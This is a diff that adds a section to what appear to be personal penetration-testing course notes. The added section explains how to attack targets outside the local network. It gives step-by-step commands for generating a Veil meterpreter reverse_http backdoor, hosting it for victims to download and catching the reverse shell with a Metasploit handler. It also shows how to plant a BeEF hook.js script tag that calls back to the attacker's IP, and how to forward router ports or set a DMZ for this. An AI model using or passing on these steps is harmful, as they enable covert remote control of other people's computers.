@@ -567,6 +567,60 @@ LPORT 8080
 > exploit
 ```
 
+# Gaining Access - Using the above attacks outside the local network
+
+Network router has a private and a public ip-address.
+If you want to hack a target you need to edit your router settings;
+In your backdoors, your ip address you are listening on, has to be your routers public ip address.
+`Google: what's my ip`
+
+### example 1
+You send a backdoor to a target computer, and you are listening to port 8080
+Your router gets the reverse connection from the target computer but does not know what to do with it.
+You need to configure the port forwarding in the router in a way that port 8080 reverse connections are forwarded to the hackers private ip.
+If you use a webserver where your backdoor is stored, and whereto you link the target to download your backdoor, you need to open that port as well. (Port 80)
+
+
+Make a backdoor
+```
+> veil
+> list
+> use 9 (meterpreter/reverse_http)
+>> LHOST 89.100.145.189 (the public ip from router)
+>> generate
+```
+name: backdoor.exe
+*Stored at: /var/lib/veil-evasion/output/compiled/backdoor.exe
+Copy to webserver in /var/www/html
+
+Listen for incomming http connections on local ip (because the router will forward the reverse connection on port 8080)
+```
+> msfconsole
+>> use exploit/multi/handler
+>>> set PAYLOAD windowss/meterpreter/reverse_http
+>>> set LPORT 8080
+>>>set LHOST 192.168.0.11 (private ip of own computer)
+>>> exploit
+```
+
+### Example 2 (Beef)
+
+Start Beef and login with beef, beef
+copy the scriptcode next to Example and paste it into the index.xtml in /var/www/html
+change the public ip from router: (code looks like this)
+`<script src="http://89.100.145.189:3000/hook.js"></script>`
+
+Enable port 3000 in router settings forwarding to private address of computer.
+If the target goes to your webserver, it get's hooked.
+
+### Forward all the ports from router to the hackers machine
+
+Go to the router settings; 
+Change DMZ address to hackers ip address.
+
+# Post Exploitation
+
+
 
 
 
